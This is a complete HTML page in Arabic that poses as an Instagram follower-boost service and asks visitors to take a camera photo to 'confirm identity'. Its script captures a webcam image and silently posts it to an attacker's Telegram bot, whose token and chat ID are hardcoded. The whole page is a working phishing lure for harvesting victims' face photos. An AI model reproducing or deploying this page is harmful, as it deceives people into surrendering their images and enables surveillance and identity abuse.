<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>زيادة متابعين إنستا</title>
  <style>
    body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
    video, canvas { margin: 10px; border: 2px solid #000; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>
  <h2>تأكيد الهوية لزيادة المتابعين</h2>
  <p>يرجى السماح للكاميرا والتقاط صورة لتأكيد الهوية</p>
  
  <video id="video" width="300" autoplay></video>
  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas><br>
  <button onclick="capture()">التقاط وإرسال</button>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => video.srcObject = stream)
      .catch(err => alert("فشل الوصول إلى الكاميرا: " + err));

    function capture() {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(sendToTelegram, 'image/jpeg');
    }

    function sendToTelegram(blob) {
      const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
      const chat_id = '6437823957';
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', blob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => {
        if (res.ok) alert("تم إرسال الصورة بنجاح");
        else alert("فشل الإرسال");
      })
      .catch(err => alert("خطأ في الإرسال: " + err));
    }
  </script>
</body>
</html>
